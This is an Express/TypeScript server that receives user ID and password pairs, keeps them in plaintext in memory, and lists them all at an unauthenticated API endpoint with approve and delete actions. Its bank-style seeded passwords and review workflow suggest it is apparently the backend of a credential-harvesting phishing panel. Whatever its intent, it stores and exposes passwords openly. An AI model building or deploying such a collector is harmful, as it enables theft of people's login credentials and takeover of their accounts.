import express, { Request, Response } from 'express';
import path from 'path';
import { fileURLToPath } from 'url';
import { createServer as createViteServer } from 'vite';

export interface Submission {
  id: string;
  userId: string;
  password: string;
  timestamp: string;
  status: 'Pending Review' | 'Approved';
}

// In-memory submission store
let submissions: Submission[] = [
  {
    id: 'sub-1',
    userId: '928410582',
    password: 'Password@2026',
    timestamp: new Date(Date.now() - 15 * 60 * 1000).toLocaleString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    }).replace(',', ''),
    status: 'Approved'
  },
  {
    id: 'sub-2',
    userId: '839201948',
    password: 'SecureBank#88',
    timestamp: new Date(Date.now() - 4 * 60 * 1000).toLocaleString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    }).replace(',', ''),
    status: 'Pending Review'
  }
];

async function startServer() {
  const app = express();
  const PORT = 3000;

  // Middleware
  app.use(express.json());

  // API Routes
  app.get('/api/health', (_req: Request, res: Response) => {
    res.json({ status: 'ok' });
  });

  // GET /api/submissions - Retrieve all submissions
  app.get('/api/submissions', (_req: Request, res: Response) => {
    res.json(submissions);
  });

  // POST /api/submissions - Create a new submission
  app.post('/api/submissions', (req: Request, res: Response) => {
    const { userId, password } = req.body;

    if (!userId || !password) {
      res.status(400).json({ error: 'User ID and Password are required' });
      return;
    }

    const now = new Date();
    const formattedTimestamp = now.toLocaleString('en-US', {
      year: 'numeric',
      month: '2-digit',
      day: '2-digit',
      hour: '2-digit',
      minute: '2-digit',
      second: '2-digit',
      hour12: false
    }).replace(',', '');

    const newSubmission: Submission = {
      id: `sub-${Date.now()}-${Math.random().toString(36).slice(2, 6)}`,
      userId: String(userId).trim(),
      password: String(password),
      timestamp: formattedTimestamp,
      status: 'Pending Review'
    };

    // Add to the front of list
    submissions.unshift(newSubmission);
    res.status(201).json({ success: true, submission: newSubmission });
  });

  // POST /api/submissions/:id/approve - Approve a submission
  app.post('/api/submissions/:id/approve', (req: Request, res: Response) => {
    const { id } = req.params;
    const submission = submissions.find(s => s.id === id);

    if (!submission) {
      res.status(404).json({ error: 'Submission not found' });
      return;
    }

    submission.status = 'Approved';
    res.json({ success: true, submission });
  });

  // DELETE /api/submissions/:id - Delete a submission
  app.delete('/api/submissions/:id', (req: Request, res: Response) => {
    const { id } = req.params;
    const initialLength = submissions.length;
    submissions = submissions.filter(s => s.id !== id);

    if (submissions.length === initialLength) {
      res.status(404).json({ error: 'Submission not found' });
      return;
    }

    res.json({ success: true });
  });

  // Vite middleware setup
  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (_req: Request, res: Response) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  app.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on port ${PORT}`);
  });
}

startServer();
